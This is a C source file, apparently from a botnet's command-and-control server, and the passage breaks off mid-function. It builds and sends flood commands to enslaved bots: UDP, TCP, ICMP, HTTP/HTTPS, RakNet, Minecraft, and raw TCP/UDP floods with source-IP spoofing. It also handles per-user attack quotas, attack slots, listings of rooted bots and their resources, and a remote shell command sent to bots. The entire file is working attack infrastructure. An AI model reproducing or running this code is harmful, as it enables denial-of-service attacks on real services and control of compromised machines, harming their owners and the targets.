#define _GNU_SOURCE

#include "../headers/commands.h"
#include "../headers/botnet.h"
#include "../headers/colors.h"
#include "../headers/theme_loader.h"
#include <arpa/inet.h>
#include <ctype.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

static int valid_ip(const char *s) {
    struct in_addr a;
    return inet_pton(AF_INET, s, &a) == 1;
}

static int valid_port(int p) {
    return p >= 1 && p <= 65535;
}

/* hostname -> IPv4 string. literal IPs pass through. 0 ok, -1 fail. */
static int resolve_host(const char *in, char *ipout, size_t outsz) {
    struct in_addr a;
    if (!in || !*in || strlen(in) > 253) return -1;
    if (inet_pton(AF_INET, in, &a) == 1) {
        strncpy(ipout, in, outsz - 1);
        ipout[outsz - 1] = '\0';
        return 0;
    }
    for (const char *c = in; *c; c++) {
        char ch = *c;
        if (!((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') ||
              (ch >= '0' && ch <= '9') || ch == '-' || ch == '.')) return -1;
    }
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(in, NULL, &hints, &res) != 0) return -1;
    int ok = -1;
    for (struct addrinfo *p = res; p; p = p->ai_next) {
        if (p->ai_family == AF_INET && p->ai_addr) {
            struct in_addr ia = ((struct sockaddr_in *)p->ai_addr)->sin_addr;
            if (inet_ntop(AF_INET, &ia, ipout, (socklen_t)outsz)) ok = 0;
            break;
        }
    }
    freeaddrinfo(res);
    return ok;
}

/* options: "psize=512 msg=hello". msg= must be LAST and unique (may contain spaces).
   safety: psize 1..1500 strict, msg capped at 512, duplicates rejected,
   unknown key=value rejected. returns 0 ok, -1 error (err filled). */
#define OPT_PSIZE_MIN 1
#define OPT_PSIZE_MAX 1500
#define OPT_MSG_MAX 512
static int parse_opts(const char *extra, int *psize, char *msg, size_t msz,
                      char *path, size_t pathsz, int *tcpflags, int *srcport,
                      char *spoof, size_t spoofsz, char *err, size_t errsz) {
    *psize = 0;
    msg[0] = '\0';
    if (path) path[0] = '\0';
    if (tcpflags) *tcpflags = -1;
    if (srcport) *srcport = 0;
    if (spoof) spoof[0] = '\0';
    if (!extra || !*extra) return 0;
    char tmp[2048];
    strncpy(tmp, extra, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    int seen_psize = 0, seen_msg = 0, seen_path = 0;
    int seen_flags = 0, seen_sport = 0, seen_spoof = 0;
    /* msg= must be unique: count option-like tokens before cutting */
    {
        char chk[2048];
        strncpy(chk, tmp, sizeof(chk) - 1);
        chk[sizeof(chk) - 1] = '\0';
        char *sv = NULL;
        int nmsg = 0;
        for (char *t = strtok_r(chk, " \t", &sv); t; t = strtok_r(NULL, " \t", &sv)) {
            if (strncmp(t, "msg=", 4) == 0 && ++nmsg > 1) {
                snprintf(err, errsz, RED "Duplicate msg option (msg= must be last)\r\n" RESET);
                return -1;
            }
        }
    }
    char *mp = strstr(tmp, "msg=");
    if (mp) {
        /* msg= must be last: anything after it that starts a new option is a dup */
        strncpy(msg, mp + 4, msz - 1);
        msg[msz - 1] = '\0';
        size_t l = strlen(msg);
        while (l > 0 && isspace((unsigned char)msg[l - 1])) msg[--l] = '\0';
        if (strlen(msg) > OPT_MSG_MAX) msg[OPT_MSG_MAX] = '\0';
        *mp = '\0';
        seen_msg = 1;
    }
    char *save = NULL;
    for (char *t = strtok_r(tmp, " \t", &save); t; t = strtok_r(NULL, " \t", &save)) {
        if (strncmp(t, "psize=", 6) == 0) {
            if (seen_psize) { snprintf(err, errsz, RED "Duplicate psize option\r\n" RESET); return -1; }
            seen_psize = 1;
            char *end = NULL;
            long v = strtol(t + 6, &end, 10);
            if (end == t + 6 || *end != '\0' || v < OPT_PSIZE_MIN || v > OPT_PSIZE_MAX) {
                snprintf(err, errsz, RED "Invalid psize (need %d-%d)\r\n" RESET, OPT_PSIZE_MIN, OPT_PSIZE_MAX);
                return -1;
            }
            *psize = (int)v;
        } else if (strncmp(t, "msg=", 4) == 0) {
            snprintf(err, errsz, RED "Duplicate msg option (msg= must be last)\r\n" RESET);
            return -1;
        } else if (strncmp(t, "path=", 5) == 0) {
            if (seen_path) { snprintf(err, errsz, RED "Duplicate path option\r\n" RESET); return -1; }
            seen_path = 1;
            const char *v = t + 5;
            if (v[0] != '/' || strchr(v, '|') || strlen(v) >= pathsz) {
                snprintf(err, errsz, RED "Invalid path (must start with /, no pipes)\r\n" RESET);
                return -1;
            }
            strncpy(path, v, pathsz - 1);
            path[pathsz - 1] = '\0';
        } else if (strncmp(t, "tcpflags=", 9) == 0) {
            if (seen_flags) { snprintf(err, errsz, RED "Duplicate tcpflags option\r\n" RESET); return -1; }
            seen_flags = 1;
            char *end = NULL;
            long v = strtol(t + 9, &end, 0);
            if (end == t + 9 || *end != '\0' || v < 0 || v > 0xff) {
                snprintf(err, errsz, RED "Invalid tcpflags (need 0x00-0xFF hex or 0-255)\r\n" RESET);
                return -1;
            }
            *tcpflags = (int)v;
        } else if (strncmp(t, "srcport=", 8) == 0) {
            if (seen_sport) { snprintf(err, errsz, RED "Duplicate srcport option\r\n" RESET); return -1; }
            seen_sport = 1;
            char *end = NULL;
            long v = strtol(t + 8, &end, 10);
            if (end == t + 8 || *end != '\0' || v < 0 || v > 65535) {
                snprintf(err, errsz, RED "Invalid srcport (need 0-65535)\r\n" RESET);
                return -1;
            }
            *srcport = (int)v;
        } else if (strncmp(t, "spoof=", 6) == 0) {
            if (seen_spoof) { snprintf(err, errsz, RED "Duplicate spoof option\r\n" RESET); return -1; }
            seen_spoof = 1;
            const char *v = t + 6;
            if (!*v || strlen(v) >= spoofsz) {
                snprintf(err, errsz, RED "Invalid spoof (need 1.2.3.0/24 or a!b)\r\n" RESET);
                return -1;
            }
            /* validate each entry now so garbage fails here, not on bots */
            char copy[512];
            strncpy(copy, v, sizeof(copy) - 1);
            copy[sizeof(copy) - 1] = '\0';
            int ok = 0;
            for (char *s = copy; *s;) {
                while (*s == '!' || *s == ',') s++;
                if (!*s) break;
                char *e = s;
                while (*e && *e != '!' && *e != ',') e++;
                char sv = *e;
                *e = '\0';
                char *sl = strchr(s, '/');
                int pfx = 32;
                if (sl) {
                    *sl = '\0';
                    char *end2 = NULL;
                    long pv = strtol(sl + 1, &end2, 10);
                    if (end2 == sl + 1 || *end2 != '\0' || pv < 0 || pv > 32) {
                        snprintf(err, errsz, RED "Invalid spoof prefix in '%.32s'\r\n" RESET, s);
                        return -1;
                    }
                    pfx = (int)pv;
                    (void)pfx;
                }
                struct in_addr ia;
                if (inet_pton(AF_INET, s, &ia) != 1) {
                    snprintf(err, errsz, RED "Invalid spoof IP '%.32s'\r\n" RESET, s);
                    return -1;
                }
                ok = 1;
                *e = sv;
                s = e;
            }
            if (!ok) {
                snprintf(err, errsz, RED "Invalid spoof (need 1.2.3.0/24 or a!b)\r\n" RESET);
                return -1;
            }
            strncpy(spoof, v, spoofsz - 1);
            spoof[spoofsz - 1] = '\0';
        } else {
            snprintf(err, errsz, RED "Unknown option '%s'\r\n" RESET, t);
            return -1;
        }
    }
    /* pipes/newlines would break bot protocol */
    for (size_t i = 0; msg[i]; i++) {
        if (msg[i] == '|' || msg[i] == '\n' || msg[i] == '\r') msg[i] = ' ';
    }
    return 0;
}

static void daily_tick(User *u) {
    time_t now = time(NULL);
    if (u->reset == 0 || now - u->reset >= 86400) {
        u->attacks_today = 0;
        u->reset = now;
    }
}

/* send attack line to up to maxbots idle bots, tag them with new slot.
   returns bots hit, -1 slots array full, -2 global slot limit. */
static int launch(const char *user, const char *method, const char *target,
                  const char *line, int maxbots, int dur, int *slot_id) {
    time_t now = time(NULL);
    int limit = global_slots();
    pthread_mutex_lock(&slot_mutex);
    if (slot_count >= MAX_SLOTS) {
        pthread_mutex_unlock(&slot_mutex);
        return -1;
    }
    if (limit > 0) {
        int active = 0;
        for (int i = 0; i < slot_count; i++) {
            if (slots[i].active) active++;
        }
        if (active >= limit) {
            pthread_mutex_unlock(&slot_mutex);
            return -2;
        }
    }
    int id = next_slot_id++;
    Slot *s = &slots[slot_count++];
    s->id = id;
    s->active = 1;
    strncpy(s->user, user, 49); s->user[49] = '\0';
    strncpy(s->method, method, 15); s->method[15] = '\0';
    strncpy(s->target, target, 63); s->target[63] = '\0';
    s->dur = dur;
    s->end = now + dur;
    pthread_mutex_unlock(&slot_mutex);

    /* pick bots: respect maxbots and also distribute across GlobalSlots */
    int freeb = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) if (bots[i].valid && !bots[i].busy) freeb++;
    pthread_mutex_unlock(&bot_mutex);
    int per_attack = maxbots > 0 ? maxbots : freeb;
    int gl = global_slots();
    if (gl > 0) {
        int active = 0;
        pthread_mutex_lock(&slot_mutex);
        for (int i = 0; i < slot_count; i++) if (slots[i].active) active++;
        pthread_mutex_unlock(&slot_mutex);
        int remain = gl - active;
        if (remain < 1) remain = 1;
        int share = (freeb + remain - 1) / remain;
        if (share < 1) share = 1;
        if (share < per_attack) per_attack = share;
    }
    if (per_attack < 1) per_attack = 1;

    static int fds[MAX_BOTS];
    static int idxs[MAX_BOTS];
    int n = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count && n < per_attack; i++) {
        if (bots[i].valid && !bots[i].busy && bots[i].sock > 0) {
            bots[i].busy = 1;
            bots[i].slot_id = id;
            fds[n] = bots[i].sock;
            idxs[n] = i;
            n++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    int hit = 0;
    for (int i = 0; i < n; i++) {
        if (send_cmd(fds[i], line) == 0) {
            hit++;
        } else {
            pthread_mutex_lock(&bot_mutex);
            int k = idxs[i];
            if (k < bot_count && bots[k].sock == fds[i] && bots[k].slot_id == id) {
                bots[k].busy = 0;
                bots[k].slot_id = -1;
            }
            pthread_mutex_unlock(&bot_mutex);
        }
    }
    *slot_id = id;
    return hit;
}

static void cmd_attack(User *u, const char *method, const char *ip, int port,
                       int dur, const char *extra, char *resp) {
    daily_tick(u);
    if (u->maxdaily > 0 && u->attacks_today >= u->maxdaily) {
        snprintf(resp, RESP_SZ, RED "Daily attack limit reached\r\n" RESET);
        return;
    }
    if (dur < 5 || dur > u->maxtime) {
        snprintf(resp, RESP_SZ, RED "Time must be 5-%d\r\n" RESET, u->maxtime);
        return;
    }
    int psize = 0;
    char msg[1024] = {0};
    char path[256] = {0};
    int tcpflags = -1, srcport = 0;
    char spoof[512] = {0};
    char oerr[256] = {0};
    if (parse_opts(extra, &psize, msg, sizeof(msg), path, sizeof(path),
                   &tcpflags, &srcport, spoof, sizeof(spoof), oerr, sizeof(oerr)) != 0) {
        snprintf(resp, RESP_SZ, "%s", oerr);
        return;
    }
    int is_raw = (strcmp(method, "tcpraw") == 0 || strcmp(method, "udpraw") == 0);
    int is_http = (strcmp(method, "http") == 0 || strcmp(method, "https") == 0 ||
                   strcmp(method, "https-classic") == 0);
    if (path[0] && !is_http) {
        snprintf(resp, RESP_SZ, RED "path= only for http/https\r\n" RESET);
        return;
    }
    if (tcpflags >= 0 && strcmp(method, "tcpraw") != 0) {
        snprintf(resp, RESP_SZ, RED "tcpflags= only for tcpraw\r\n" RESET);
        return;
    }
    if (spoof[0] && !is_raw) {
        snprintf(resp, RESP_SZ, RED "spoof= only for tcpraw/udpraw\r\n" RESET);
        return;
    }
    if (srcport > 0 && !is_raw) {
        snprintf(resp, RESP_SZ, RED "srcport= only for tcpraw/udpraw\r\n" RESET);
        return;
    }

    char line[MAX_CMD];
    char target[64];
    if (strcmp(method, "udp") == 0) {
        if (!valid_port(port)) { snprintf(resp, RESP_SZ, RED "Bad port\r\n" RESET); return; }
        if (psize <= 0) psize = 512;
        snprintf(line, sizeof(line), "udp|%s|%d|%d|%d|%s\n", ip, port, dur, psize, msg);
        snprintf(target, sizeof(target), "%s:%d", ip, port);
    } else if (strcmp(method, "tcp") == 0) {
        if (!valid_port(port)) { snprintf(resp, RESP_SZ, RED "Bad port\r\n" RESET); return; }
        if (psize <= 0) psize = 1024;
        snprintf(line, sizeof(line), "tcp|%s|%d|%d|%d|%s\n", ip, port, dur, psize, msg);
        snprintf(target, sizeof(target), "%s:%d", ip, port);
    } else if (strcmp(method, "icmp") == 0) {
        if (psize <= 0) psize = 64;
        snprintf(line, sizeof(line), "icmp|%s|%d|%d|%s\n", ip, dur, psize, msg);
        snprintf(target, sizeof(target), "%s", ip);
    } else if (strcmp(method, "http") == 0) {
        if (!valid_port(port)) { snprintf(resp, RESP_SZ, RED "Bad port\r\n" RESET); return; }
        if (!path[0]) strncpy(path, "/", sizeof(path) - 1);
        snprintf(line, sizeof(line), "http|%s|%d|%d|%s\n", ip, port, dur, path);
        snprintf(target, sizeof(target), "%s:%d", ip, port);
    } else if (strcmp(method, "https-classic") == 0) {
        if (!valid_port(port)) { snprintf(resp, RESP_SZ, RED "Bad port\r\n" RESET); return; }
        char rip[64] = {0};
        if (resolve_host(ip, rip, sizeof(rip)) != 0) {
            snprintf(resp, RESP_SZ, RED "Could not resolve host\r\n" RESET);
            return;
        }
        if (!path[0]) strncpy(path, "/", sizeof(path) - 1);
        snprintf(line, sizeof(line), "https-classic|%s|%d|%d|%s|%s\n", rip, port, dur, ip, path);
        snprintf(target, sizeof(target), "%s:%d", ip, port);
    } else if (strcmp(method, "raknet") == 0) {
        if (!valid_port(port)) { snprintf(resp, RESP_SZ, RED "Bad port\r\n" RESET); return; }
        snprintf(line, sizeof(line), "raknet|%s|%d|%d\n", ip, port, dur);
        snprintf(target, sizeof(target), "%s:%d", ip, port);
    } else if (strcmp(method, "minecraft") == 0) {
        if (!valid_port(port)) { snprintf(resp, RESP_SZ, RED "Bad port\r\n" RESET); return; }
        snprintf(line, sizeof(line), "minecraft|%s|%d|%d\n", ip, port, dur);
        snprintf(target, sizeof(target), "%s:%d", ip, port);
    } else if (strcmp(method, "tcpraw") == 0) {
        if (!valid_port(port)) { snprintf(resp, RESP_SZ, RED "Bad port\r\n" RESET); return; }
        if (tcpflags < 0) tcpflags = 0x02;
        snprintf(line, sizeof(line), "tcpraw|%s|%d|%d|%d|%d|%s|%d|%s\n",
                 ip, port, dur, tcpflags, srcport, spoof, psize, msg);
        snprintf(target, sizeof(target), "%s:%d", ip, port);
    } else if (strcmp(method, "udpraw") == 0) {
        if (!valid_port(port)) { snprintf(resp, RESP_SZ, RED "Bad port\r\n" RESET); return; }
        snprintf(line, sizeof(line), "udpraw|%s|%d|%d|%d|%s|%d|%s\n",
                 ip, port, dur, srcport, spoof, psize, msg);
        snprintf(target, sizeof(target), "%s:%d", ip, port);
    } else {
        if (!valid_port(port)) { snprintf(resp, RESP_SZ, RED "Bad port\r\n" RESET); return; }
        char rip[64] = {0};
        if (resolve_host(ip, rip, sizeof(rip)) != 0) {
            snprintf(resp, RESP_SZ, RED "Could not resolve host\r\n" RESET);
            return;
        }
        snprintf(line, sizeof(line), "https|%s|%d|%d|%s\n", rip, port, dur, ip);
        snprintf(target, sizeof(target), "%s:%d", ip, port);
    }

    int slot_id = 0;
    int hit = launch(u->user, method, target, line, u->maxbots, dur, &slot_id);
    if (hit == -2) {
        snprintf(resp, RESP_SZ, RED "Global slots full\r\n" RESET);
        return;
    }
    if (hit < 0) {
        snprintf(resp, RESP_SZ, RED "No free slots\r\n" RESET);
        return;
    }
    if (hit == 0) {
        snprintf(resp, RESP_SZ, RED "No bots available\r\n" RESET);
        return;
    }
    u->attacks_today++;
    themed_snprintf(resp, RESP_SZ, "{LIME}Attack #%d: %s %s for %ds on %d bots\r\n{RESET}",
             slot_id, method, target, dur, hit);
}

static void cmd_stop(User *u, int id, char *resp) {
    pthread_mutex_lock(&slot_mutex);
    int idx = -1;
    for (int i = 0; i < slot_count; i++) {
        if (slots[i].active && slots[i].id == id) { idx = i; break; }
    }
    if (idx < 0) {
        pthread_mutex_unlock(&slot_mutex);
        snprintf(resp, RESP_SZ, RED "Attack #%d not found\r\n" RESET, id);
        return;
    }
    if (!u->is_admin && strcmp(slots[idx].user, u->user) != 0) {
        pthread_mutex_unlock(&slot_mutex);
        snprintf(resp, RESP_SZ, RED "Not your attack\r\n" RESET);
        return;
    }
    slots[idx].active = 0;
    pthread_mutex_unlock(&slot_mutex);

    int n = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].valid && bots[i].slot_id == id && bots[i].sock > 0) {
            send_cmd(bots[i].sock, "stop\n");
            bots[i].busy = 0;
            bots[i].slot_id = -1;
            n++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    themed_snprintf(resp, RESP_SZ, "{LIME}Stopped attack #%d (%d bots)\r\n{RESET}", id, n);
}

static void cmd_stopall(User *u, char *resp) {
    if (!u->is_admin) {
        snprintf(resp, RESP_SZ, RED "Admin only\r\n" RESET);
        return;
    }
    pthread_mutex_lock(&slot_mutex);
    for (int i = 0; i < slot_count; i++) slots[i].active = 0;
    pthread_mutex_unlock(&slot_mutex);
    int n = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].valid && bots[i].sock > 0) {
            if (send_cmd(bots[i].sock, "stop\n") == 0) n++;
            bots[i].busy = 0;
            bots[i].slot_id = -1;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    themed_snprintf(resp, RESP_SZ, "{LIME}Stopped all (%d bots)\r\n{RESET}", n);
}

static void fmt_mega(long mb, char *out, size_t n) {
    if (mb >= 1024L * 1024L) {
        snprintf(out, n, "%.1fT", (double)mb / (1024.0 * 1024.0));
    } else if (mb >= 1024L) {
        snprintf(out, n, "%.1fG", (double)mb / 1024.0);
    } else {
        snprintf(out, n, "%ldM", mb);
    }
}

static void cmd_bots_resources(User *u, char *resp) {
    (void)u;
    int total = 0, rooted = 0;
    long cpus = 0, ram = 0, disk = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].valid) continue;
        total++;
        if (bots[i].rooted) rooted++;
        cpus += bots[i].cpus;
        ram += bots[i].ram_mb;
        disk += bots[i].disk_mb;
    }
    pthread_mutex_unlock(&bot_mutex);
    if (total == 0) {
        themed_snprintf(resp, RESP_SZ, "No bots online\r\n");
        return;
    }
    char rams[16] = {0}, disks[16] = {0};
    fmt_mega(ram, rams, sizeof(rams));
    fmt_mega(disk, disks, sizeof(disks));
    themed_snprintf(resp, RESP_SZ,
             "{LIME}User bots: {RESET}%d\r\n"
             "{LIME}Rooted bots: {RESET}%d\r\n"
             "{LIME}CPUs: {RESET}%ld\r\n"
             "{LIME}RAM: {RESET}%s\r\n"
             "{LIME}Disk: {RESET}%s\r\n{RESET}",
             total, rooted, cpus, rams, disks);
}

static void cmd_bots(User *u, const char *args, char *resp) {
    if (!u->is_admin && !users_can_view_bots()) {
        snprintf(resp, RESP_SZ, RED "Admin only\r\n" RESET);
        return;
    }
    if (args && (strcmp(args, "-r") == 0 || strncmp(args, "-r ", 3) == 0)) {
        cmd_bots_resources(u, resp);
        return;
    }
    int total = 0, freeb = 0, busyb = 0;
    bot_counts(&total, &freeb, &busyb);
    themed_snprintf(resp, RESP_SZ,
             "{LIME}Total: {RESET}%d\r\n"
             "{LIME}Free: {RESET}%d\r\n"
             "{LIME}Busy: {RESET}%d\r\n{RESET}",
             total, freeb, busyb);
}

static void fmt_dur(time_t secs, char *out, size_t n) {
    if (secs < 0) secs = 0;
    if (secs > 99999 * 86400L) secs = 99999 * 86400L;
    long d = (long)(secs / 86400);
    long h = (long)((secs % 86400) / 3600);
    long m = (long)((secs % 3600) / 60);
    long s = (long)(secs % 60);
    if (d > 0) snprintf(out, n, "%ldd%ldh", d, h);
    else if (h > 0) snprintf(out, n, "%ldh%ldm", h, m);
    else if (m > 0) snprintf(out, n, "%ldm%lds", m, s);
    else snprintf(out, n, "%lds", s);
}

static void cmd_ongoing(User *u, char *resp) {
    slot_reap();
    char *p = resp;
    size_t left = RESP_SZ;
    int found = 0;
    time_t now = time(NULL);
    pthread_mutex_lock(&slot_mutex);
    for (int i = 0; i < slot_count; i++) {
        if (!slots[i].active) continue;
        if (!u->is_admin && strcmp(slots[i].user, u->user) != 0) continue;
        int rem = (int)(slots[i].end - now);
        if (rem < 0) rem = 0;
        int elap = slots[i].dur - rem;
        if (elap < 0) elap = 0;
        int nbots = 0;
        pthread_mutex_lock(&bot_mutex);
        for (int b = 0; b < bot_count; b++) {
            if (bots[b].valid && bots[b].busy && bots[b].slot_id == slots[i].id) nbots++;
        }
        pthread_mutex_unlock(&bot_mutex);
        found = 1;
        int w;
        char tagged[512];
        if (u->is_admin) {
            snprintf(tagged, sizeof(tagged), "{RED}[#%d] {LIME}%s %s {RED}| {LIME}%ds/%ds {RED}"
                         "| {LIME}%d bots {RED}| by {LIME}%s\r\n{RESET}",
                         slots[i].id, slots[i].method, slots[i].target,
                         elap, slots[i].dur, nbots, slots[i].user);
        } else {
            snprintf(tagged, sizeof(tagged), "{RED}[#%d] {LIME}%s %s {RED}| {LIME}%ds/%ds {RED}"
                         "| {LIME}%d bots\r\n{RESET}",
                         slots[i].id, slots[i].method, slots[i].target,
                         elap, slots[i].dur, nbots);
        }
        char *conv = process_string_colors(tagged);
        if (!conv) break;
        w = snprintf(p, left, "%s", conv);
        free_theme_string(conv);
        if (w <= 0 || (size_t)w >= left) break;
        p += w;
        left -= (size_t)w;
    }
    pthread_mutex_unlock(&slot_mutex);
    if (!found) themed_snprintf(resp, RESP_SZ, "Nothing running\r\n");
}

static void cmd_attacks(User *u, char *resp) {

    slot_reap();
    char *p = resp;
    size_t left = RESP_SZ;
    int found = 0;
    pthread_mutex_lock(&slot_mutex);
    for (int i = 0; i < slot_count; i++) {
        if (!slots[i].active) continue;
        if (!u->is_admin && strcmp(slots[i].user, u->user) != 0) continue;
        found = 1;
        int rem = (int)(slots[i].end - time(NULL));
        if (rem < 0) rem = 0;
        char tagged[512];
        snprintf(tagged, sizeof(tagged), "{RED}ID: {LIME}%d{RED} | Method: {LIME}%s{RED}"
                         " | Target: {LIME}%s{RED} | User: {LIME}%s{RED} | Left: {LIME}%ds\r\n{RESET}",
                         slots[i].id, slots[i].method, slots[i].target, slots[i].user, rem);
        char *conv = process_string_colors(tagged);
        if (!conv) break;
        int w = snprintf(p, left, "%s", conv);
        free_theme_string(conv);
        if (w <= 0 || (size_t)w >= left) break;
        p += w;
        left -= (size_t)w;
    }
    pthread_mutex_unlock(&slot_mutex);
    if (!found) themed_snprintf(resp, RESP_SZ, "No active attacks\r\n");
}

static void cmd_user(User *u, const char *name, char *resp) {
    const User *t = u;
    if (name && *name) {
        if (!u->is_admin && strcmp(name, u->user) != 0) {
            snprintf(resp, RESP_SZ, RED "Admin only\r\n" RESET);
            return;
        }
        t = NULL;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(users[i].user, name) == 0) { t = &users[i]; break; }
        }
        if (!t) { snprintf(resp, RESP_SZ, RED "User not found\r\n" RESET); return; }
    }
    char daily[32];
    if (t->maxdaily > 0) snprintf(daily, sizeof(daily), "%d/%d", t->attacks_today, t->maxdaily);
    else snprintf(daily, sizeof(daily), "%d/inf", t->attacks_today);
    char atk[32];
    if (t->maxdaily > 0) snprintf(atk, sizeof(atk), "%d/%d", t->attacks_today, t->maxdaily);
    else snprintf(atk, sizeof(atk), "%d/Infinite", t->attacks_today);
    char tagged[2048];
    snprintf(tagged, sizeof(tagged),
             "{LIME}User: {RESET}%s\r\n"
             "{LIME}Max time: {RESET}%d\r\n"
             "{LIME}Max bots: {RESET}%d\r\n"
             "{LIME}Daily: {RESET}%s\r\n"
             "{LIME}Attacks: {RESET}%s\r\n"
             "{LIME}Admin: {RESET}%s\r\n"
             "{LIME}Online: {RESET}%s\r\n{RESET}",
             t->user, t->maxtime, t->maxbots, daily, atk,
             t->is_admin ? "yes" : "no", t->is_logged_in ? "yes" : "no");
    char *conv = process_string_colors(tagged);
    if (conv) {
        strncpy(resp, conv, RESP_SZ - 1);
        resp[RESP_SZ - 1] = '\0';
        free_theme_string(conv);
    } else {
        snprintf(resp, RESP_SZ, "User: %s\r\n", t->user);
    }
}

static void cmd_users(User *u, char *resp) {
    if (!u->is_admin) {
        snprintf(resp, RESP_SZ, RED "Admin only\r\n" RESET);
        return;
    }
    char *p = resp;
    size_t left = RESP_SZ;
    int online = 0;
    for (int i = 0; i < user_count; i++) {
        if (users[i].is_logged_in) online++;
    }
    int w = snprintf(p, left, "Users (%d online, %d bots):\r\n", online, bot_valid_count());
    if (w > 0 && (size_t)w < left) { p += w; left -= (size_t)w; }
    time_t now = time(NULL);
    for (int i = 0; i < user_count; i++) {
        if (users[i].is_logged_in) {
            char dur[32] = {0};
            fmt_dur(users[i].login_at ? now - users[i].login_at : 0, dur, sizeof(dur));
            char tagged[256];
            snprintf(tagged, sizeof(tagged), "\r{RED}[%s] [%s] %s {RESET}- {LIME}ONLINE\r\n{RESET}",
                         dur, users[i].ip[0] ? users[i].ip : "?", users[i].user);
            char *conv = process_string_colors(tagged);
            w = snprintf(p, left, "%s", conv ? conv : tagged);
            if (conv) free_theme_string(conv);
        } else {
            char tagged[256];
            snprintf(tagged, sizeof(tagged), "\r{RED}[--] [--] %s {RESET}- {RED}OFFLINE\r\n{RESET}",
                         users[i].user);
            char *conv = process_string_colors(tagged);
            w = snprintf(p, left, "%s", conv ? conv : tagged);
            if (conv) free_theme_string(conv);
        }
        if (w <= 0 || (size_t)w >= left) break;
        p += w;
        left -= (size_t)w;
    }
}

static void cmd_groups(User *u, const char *args, char *resp) {
    (void)u;
    char filter[64] = {0};
    if (args && *args) sscanf(args, "%63s", filter);
    char groups[256][64];
    int counts[256] = {0};
    int ng = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count && ng < 256; i++) {
        if (!bots[i].valid) continue;
        if (filter[0] && strcmp(bots[i].group, filter) != 0 && strcmp(bots[i].arch, filter) != 0) continue;
        int k;
        for (k = 0; k < ng; k++) {
            if (strcmp(groups[k], bots[i].group) == 0) break;
        }
        if (k == ng) {
            strncpy(groups[ng], bots[i].group, 63);
            groups[ng][63] = '\0';
            counts[ng] = 1;
            ng++;
        } else {
            counts[k]++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    char *p = resp;
    size_t left = RESP_SZ;
    if (ng == 0) {
        themed_snprintf(resp, RESP_SZ, "No groups online\r\n");
        return;
    }
    for (int k = 0; k < ng; k++) {
        char tagged[160];
        snprintf(tagged, sizeof(tagged), "{LIME}%.63s{RED}: {LIME}%d\r\n", groups[k], counts[k]);
        char *conv = process_string_colors(tagged);
        int w = snprintf(p, left, "%s", conv ? conv : tagged);
        if (conv) free_theme_string(conv);
        if (w <= 0 || (size_t)w >= left) break;
        p += w;
        left -= (size_t)w;
    }
    {
        char *conv = process_string_colors("{RESET}");
        int w = snprintf(p, left, "%s", conv ? conv : "");
        if (conv) free_theme_string(conv);
        (void)w;
    }
}

static void cmd_archs(User *u, char *resp) {
    (void)u;
    char archs[64][32];
    int counts[64] = {0};
    int na = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count && na < 64; i++) {
        if (!bots[i].valid) continue;
        int k;
        for (k = 0; k < na; k++) {
            if (strcmp(archs[k], bots[i].arch) == 0) break;
        }
        if (k == na) {
            strncpy(archs[na], bots[i].arch, 31);
            archs[na][31] = '\0';
            counts[na] = 1;
            na++;
        } else {
            counts[k]++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    char *p = resp;
    size_t left = RESP_SZ;
    if (na == 0) {
        themed_snprintf(resp, RESP_SZ, "No archs online\r\n");
        return;
    }
    for (int k = 0; k < na; k++) {
        char tagged[128];
        snprintf(tagged, sizeof(tagged), "{LIME}%.31s{RED}: {LIME}%d\r\n", archs[k], counts[k]);
        char *conv = process_string_colors(tagged);
        int w = snprintf(p, left, "%s", conv ? conv : tagged);
        if (conv) free_theme_string(conv);
        if (w <= 0 || (size_t)w >= left) break;
        p += w;
        left -= (size_t)w;
    }
    {
        char *conv = process_string_colors("{RESET}");
        int w = snprintf(p, left, "%s", conv ? conv : "");
        if (conv) free_theme_string(conv);
        (void)w;
    }
}

static void cmd_kick(User *u, const char *name, char *resp) {
    if (!u->is_admin) {
        snprintf(resp, RESP_SZ, RED "Admin only\r\n" RESET);
        return;
    }
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, name) == 0) {
            if (!users[i].is_logged_in || user_sockets[i] <= 0) {
                snprintf(resp, RESP_SZ, RED "User not online\r\n" RESET);
                return;
            }
            pthread_mutex_lock(&user_mutex);
            close(user_sockets[i]);
            user_sockets[i] = 0;
            pthread_mutex_unlock(&user_mutex);
            users[i].is_logged_in = 0;
            users[i].ip[0] = '\0';
            users[i].login_at = 0;
            themed_snprintf(resp, RESP_SZ, "{LIME}Kicked %s\r\n{RESET}", name);
            return;
        }
    }
    snprintf(resp, RESP_SZ, RED "User not found\r\n" RESET);
}

static int bot_ip_match(int idx, const char *ip) {
    char lip[32] = {0};
    inet_ntop(AF_INET, &bots[idx].addr.sin_addr, lip, sizeof(lip));
    return strcmp(lip, ip) == 0;
}

static void cmd_shell(User *u, const char *args, char *resp) {
    if (!u->is_admin) {
        snprintf(resp, RESP_SZ, RED "Admin only\r\n" RESET);
        return;
    }
    char target[64] = {0};
    const char *sp = strchr(args, ' ');
    if (!sp) {
        snprintf(resp, RESP_SZ, RED "Usage: !shell <ip|all> <cmd>\r\n" RESET);
        return;
    }
    size_t tl = (size_t)(sp - args);
    if (tl == 0 || tl >= sizeof(target)) {
